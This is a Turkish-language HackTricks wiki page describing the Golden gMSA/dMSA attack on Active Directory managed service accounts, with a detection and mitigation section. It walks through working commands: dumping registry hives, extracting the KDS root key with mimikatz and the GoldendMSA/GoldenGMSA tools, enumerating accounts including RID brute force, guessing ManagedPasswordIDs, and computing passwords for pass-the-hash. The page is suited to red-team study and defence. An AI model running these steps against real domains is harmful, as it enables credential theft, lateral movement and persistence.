# Golden gMSA/dMSA Attack (Managed Service Account Parolalarının Offline Türetilmesi)

{{#include ../../banners/hacktricks-training.md}}

## Genel Bakış

Windows Managed Service Account'ları (MSA), parolalarını manuel olarak yönetme ihtiyacı olmadan servisleri çalıştırmak için tasarlanmış özel principal'lardır.
İki ana çeşidi vardır:

1. **gMSA** – group Managed Service Account – `msDS-GroupMSAMembership` attribute'unda yetkilendirilmiş birden fazla host üzerinde kullanılabilir.
2. **dMSA** – delegated Managed Service Account – aynı cryptography'ye dayanan ve daha ayrıntılı delegation senaryolarına olanak tanıyan, gMSA'nın (preview) halefidir.

Her iki varyantta da **parola**, normal bir NT-hash gibi her Domain Controller (DC) üzerinde saklanmaz. Bunun yerine her DC mevcut parolayı anlık olarak şu bilgilerden türetebilir:

* Forest genelindeki **KDS Root Key** (`KRBTGT\KDS`) – her DC'ye `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` container'ı altında replicate edilen, rastgele oluşturulmuş GUID adlandırmalı secret.
* Hedef account'un **SID** değeri.
* `msDS-ManagedPasswordId` attribute'unda bulunan account'a özel **ManagedPasswordID** (GUID).

Türetme işlemi: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → son olarak **base64-encoded** hale getirilen ve `msDS-ManagedPassword` attribute'unda saklanan 240 byte'lık blob.
Normal parola kullanımı sırasında herhangi bir Kerberos trafiği veya domain etkileşimi gerekmez – bir member host, üç input'u bildiği sürece parolayı local olarak türetebilir.

## Golden gMSA / Golden dMSA Attack

Bir attacker üç input'un tamamını **offline** olarak elde edebilirse, DC'ye tekrar dokunmadan forest'taki **herhangi bir gMSA/dMSA için geçerli mevcut ve gelecekteki parolaları** hesaplayabilir ve şunları bypass edebilir:<sup>[[1]](#references)[[2]](#references)</sup>

* LDAP read auditing
* Password change intervals (önceden hesaplayabilirler)

Bu, service account'lar için bir *Golden Ticket* analogudur.<sup>[[1]](#references)[[2]](#references)</sup>

### Ön Koşullar

1. **Bir DC'nin forest-level compromise edilmesi** (veya Enterprise Admin) ya da forest'taki DC'lerden birine `SYSTEM` erişimi.
2. Service account'ları enumerate etme yeteneği (LDAP read / RID brute-force).
3. [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) veya eşdeğer code'u çalıştırmak için .NET ≥ 4.7.2 x64 workstation.<sup>[[3]](#references)</sup>

### Golden gMSA / dMSA
#### Phase 1 – KDS Root Key'i Extract Etme

Herhangi bir DC'den dump alın (Volume Shadow Copy / raw SAM+SECURITY hives veya remote secrets):<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
`RootKey` (GUID adı) olarak etiketlenen base64 string'i sonraki adımlarda gereklidir.<sup>[[1]](#references)[[2]](#references)</sup>

##### Aşama 2 – gMSA / dMSA nesnelerini enumerate etme

En azından `sAMAccountName`, `objectSid` ve `msDS-ManagedPasswordId` bilgilerini alın:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) yardımcı modları uygular:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Aşama 3 – ManagedPasswordID'yi Tahmin Etme / Keşfetme (eksik olduğunda)

Bazı dağıtımlar, ACL-korumalı okumalarda `msDS-ManagedPasswordId` değerini *strip* eder.
GUID 128 bit olduğundan naif bruteforce uygulanabilir değildir, ancak:

1. İlk **32 bit = hesabın oluşturulma zamanının Unix epoch zamanı** (dakika çözünürlüğünde).
2. Ardından 96 rastgele bit gelir.

Bu nedenle her hesap için **dar bir wordlist** (birkaç saatlik ± aralık) gerçekçidir.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Araç, aday parolaları hesaplar ve base64 blob'larını gerçek `msDS-ManagedPassword` attribute'u ile karşılaştırır; eşleşme doğru GUID'yi ortaya çıkarır.

##### Phase 4 – Offline Password Computation & Conversion

ManagedPasswordID bilindiğinde, geçerli parola tek bir komutla elde edilir:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Ortaya çıkan hash'ler **mimikatz** (`sekurlsa::pth`) veya Kerberos abuse için **Rubeus** ile enjekte edilebilir; bu da gizli **lateral movement** ve **persistence** sağlar.

## Tespit ve Azaltma

* **DC backup and registry hive read** yeteneklerini Tier-0 yöneticileriyle sınırlandırın.
* DC'lerde **Directory Services Restore Mode (DSRM)** veya **Volume Shadow Copy** oluşturulmasını izleyin.
* `CN=Master Root Keys,…` okumalarını/değişikliklerini ve service account'ların `userAccountControl` flag'lerini denetleyin.
* Olağandışı **base64 password writes** veya host'lar arasında service password'ların aniden yeniden kullanılmasını tespit edin.
* Tier-0 izolasyonunun mümkün olmadığı durumlarda, yüksek ayrıcalıklı gMSA'ları düzenli ve rastgele rotation uygulanan **classic service accounts**'lara dönüştürmeyi değerlendirin.

## Tooling

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – bu sayfada kullanılan referans implementasyon.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – bu sayfada kullanılan referans implementasyon.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – türetilen AES key'lerini kullanarak pass-the-ticket.

## Referanslar

- [1] [Golden dMSA – delegated Managed Service Accounts için authentication bypass](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
